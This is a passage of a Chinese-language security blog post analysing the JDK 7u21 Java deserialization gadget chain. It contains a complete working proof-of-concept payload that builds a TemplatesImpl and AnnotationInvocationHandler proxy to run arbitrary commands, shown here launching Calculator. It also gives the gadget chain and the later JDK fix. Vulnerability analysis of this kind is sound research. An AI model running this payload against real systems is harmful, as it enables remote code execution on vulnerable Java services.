+<p>&#x90A3;&#x4E48;&#x53EA;&#x8981;&#x63A7;&#x5236;&#x7B2C;&#x4E00;&#x6BB5;&#x7ED3;&#x679C;&#x4E3A; 0 &#xFF0C;&#x90A3;&#x4E48;&#x7B97;&#x51FA;&#x6765;&#x5F02;&#x6216;&#x503C;&#x4E0D;&#x53D8;&#xFF0C;&#x90A3;&#x4E48;&#x7ED3;&#x5408;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x8BF4;&#x7684;trick&#xFF0C;var3 &#x6B64;&#x523B;&#x7684; key &#x4E3A; <code>f5a5a608</code>&#xFF0C;&#x56E0;&#x6B64;&#x8DDF;&#x4EFB;&#x4F55;&#x6570;&#x76F8;&#x4E58;&#x90FD;&#x4E3A; 0</p>
+<p>&#x56DE;&#x5230;&#x6211;&#x4EEC; <code>HashMap#put</code> &#x7684; <code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code></p>
+<p>&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x4E3A; hash &#x5224;&#x65AD;&#xFF0C;&#x6211;&#x4EEC;&#x521A;&#x521A;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x5DF2;&#x7ECF;&#x8BA9;&#x5176;&#x76F8;&#x7B49;&#x4E86;</p>
+<p>&#x7B2C;&#x4E8C;&#x4E2A;&#x5224;&#x65AD;&#x5C06;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x65F6;&#x7684; key &#x53D6;&#x51FA;&#x548C;&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x65F6;&#x7684; key &#x6BD4;&#x8F83;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x7684;key&#x662F;TemplatesImpl&#x5BF9;&#x8C61;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x65F6; key &#x4E3A; Proxy &#x5BF9;&#x8C61;&#xFF0C;&#x6240;&#x4EE5;&#x7ED3;&#x679C;&#x4E3A;flase</p>
+<p>&#x6700;&#x540E;&#x8C03;&#x7528; <code>key.equals(k)</code>&#xFF0C;&#x8FD9;&#x91CC;&#x7684; key &#x4E3A;&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x7684;&#xFF0C;k &#x4E3A;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x603B;&#x7ED3;&#x4E86;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x6709;&#x5E8F;&#x7684;HashSet&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x7684; LinkedHashSet&#x3002;&#x8FD9;&#x6837;&#x624D;&#x80FD;&#x4FDD;&#x8BC1;&#x6211;&#x4EEC;&#x7684;&#x8C03;&#x7528;&#x5148;&#x540E;</p>
+<p><strong>JDK 7u21 payload</strong></p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span></span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Map testMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Constructor aih_construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="hljs-number">0</span>];</span><br><span class="line">        aih_construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler testHandler = (InvocationHandler) aih_construct.newInstance(Override.class, testMap);</span><br><span class="line">        setFieldValue(testHandler, <span class="hljs-string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]{Templates.class}, testHandler);</span><br><span class="line"><span class="hljs-comment">//        proxy.equals(templates);</span></span><br><span class="line">        String magicStr = <span class="hljs-string">&quot;f5a5a608&quot;</span>;</span><br><span class="line">        HashSet testTarget = <span class="hljs-keyword">new</span> LinkedHashSet();</span><br><span class="line">        testTarget.add(templates);</span><br><span class="line">        testTarget.add(proxy);</span><br><span class="line">        testMap.put(magicStr, templates);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(testTarget);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x5229;&#x7528;&#x94FE;</p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget Chain</span><br><span class="line">    LinkedHashSet.readObject()</span><br><span class="line">    LinkedHashSet.add()</span><br><span class="line">        ...</span><br><span class="line">        TemplatesImpl.hashCode() (X)</span><br><span class="line">    LinkedHashSet.add()</span><br><span class="line">        ...</span><br><span class="line">        Proxy(Templates).hashCode() (X)</span><br><span class="line">            AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">            AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">                String.hashCode() (<span class="hljs-number">0</span>)</span><br><span class="line">                AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">                TemplatesImpl.hashCode() (X)</span><br><span class="line">        Proxy(Templates).equals()</span><br><span class="line">            AnnotationInvocationHandler.invoke()</span><br><span class="line">            AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">                Method.invoke()</span><br><span class="line">                ...</span><br><span class="line">                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                    TemplatesImpl.newTransformer()</span><br><span class="line">                        TemplatesImpl.getTransletInstance()</span><br><span class="line">                        TemplatesImpl.defineTransletClasses()</span><br><span class="line">                            ClassLoader.defineClass()</span><br><span class="line">                            Class.newInstance()</span><br><span class="line">                            ...</span><br><span class="line">                                MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                ...</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h2><p>7u80&#x7248;&#x672C;</p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="hljs-keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="hljs-number">1</span> &amp;&amp; var3[<span class="hljs-number">0</span>] == Annotation.class) {</span><br><span class="line">            <span class="hljs-keyword">this</span>.type = var1;</span><br><span class="line">            <span class="hljs-keyword">this</span>.memberValues = var2;</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AnnotationFormatError(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x5BF9; <code>this.type</code> &#x8FDB;&#x884C;&#x4E86;&#x6821;&#x9A8C;&#x5FC5;&#x987B;&#x4E3A; Annotation.class&#xFF0C;&#x540C;&#x65F6;&#x589E;&#x52A0;&#x4E86;&#x5F02;&#x5E38;&#x629B;&#x51FA;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5931;&#x8D25;</p>
+<blockquote>
+<p>7u25-b01&#x3001;7u25-b02&#x5C1A;&#x672A;&#x5982;&#x6B64;&#x4FEE;&#x8865;&#xFF0C;341&#x884C;&#x5904;&#x4ECD;&#x5728;return&#x3002;&#x6709;&#x4E9B;&#x6587;&#x7AE0;&#x8BF4;&#x4FEE;&#x8865;&#x65B9;&#x6848;&#x662F;&#x68C0;<br>&#x67E5;&#x4E86;AnnotationInvocationHandler.type&#xFF0C;&#x4F30;&#x8BA1;&#x4ED6;&#x4EEC;&#x662F;&#x6839;&#x636E;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x8FD9;&#x4E48;&#x8BF4;&#x7684;&#x3002;&#x4E8B;<br>&#x5B9E;&#x4E0A;&#x5BF9;AnnotationInvocationHandler.type&#x7684;&#x68C0;&#x67E5;&#x4E00;&#x76F4;&#x5B58;&#x5728;&#xFF0C;&#x8981;&#x6C42;type&#x4E0E;<br>java.lang.annotation.Annotation&#x6709;&#x6D3E;&#x751F;&#x3001;&#x7EE7;&#x627F;&#x3001;&#x5B9E;&#x73B0;&#x5173;&#x7CFB;&#xFF0C;&#x4F46;7u25-b03&#x4E4B;&#x524D;&#x53D1;&#x73B0;<br>&#x95EE;&#x9898;&#x540E;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x88AB;341&#x884C;&#x7684;catch&#x6355;&#x6349;&#x4E4B;&#x540E;&#x6CA1;&#x6709;&#x7EE7;&#x7EED;&#x629B;&#x5F02;&#x5E38;&#xFF0C;&#x800C;&#x662F;return&#x4E86;</p>
+</blockquote>
+<p>&#x540E;&#x7EED; JRE8u20 &#x5BF9;&#x6B64;&#x8FDB;&#x884C;&#x4E86;&#x7ED5;&#x8FC7;&#xFF0C;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x7578;&#x578B;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x5F97;&#x9488;&#x5BF9; <code>AnnotationInvocationHandler.type</code> &#x7684;&#x68C0;&#x67E5;&#x88AB;&#x547D;&#x4E2D;&#x65F6;&#x6240;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x88AB; <code>BeanContextSupport.readChildren()</code> &#x4E2D;&#x7684; <code>try/catch</code> &#x5757;&#x6355;&#x83B7;&#x5E76; continue&#xFF0C;&#x4F46;&#x6784;&#x9020;&#x8FC7;&#x4E8E;&#x590D;&#x6742;&#xFF0C;&#x4E14;&#x6CA1;&#x6709;&#x65B0;&#x7684; gadget&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x5728;&#x672C;&#x6587;&#x63A2;&#x8BA8;&#x8303;&#x56F4;&#x5185;</p>
+<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">https://xz.aliyun.com/t/3847</a></p>
+<p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p><a href="http://scz.617.cn/" target="_blank" rel="noopener">http://scz.617.cn/</a></p>
+</body></html>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Java/">#Java</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">Commons Collections 反序列化利用链分析</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2021 P2hm1n&nbsp;
+                 
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/P2hm1n" target="_blank" rel="noopener">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("zh-CN");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Suche etwas..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
+                TAGS: 'Tags',
+                UNTITLED: '(제목없음)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+    
+</body>
+</html>
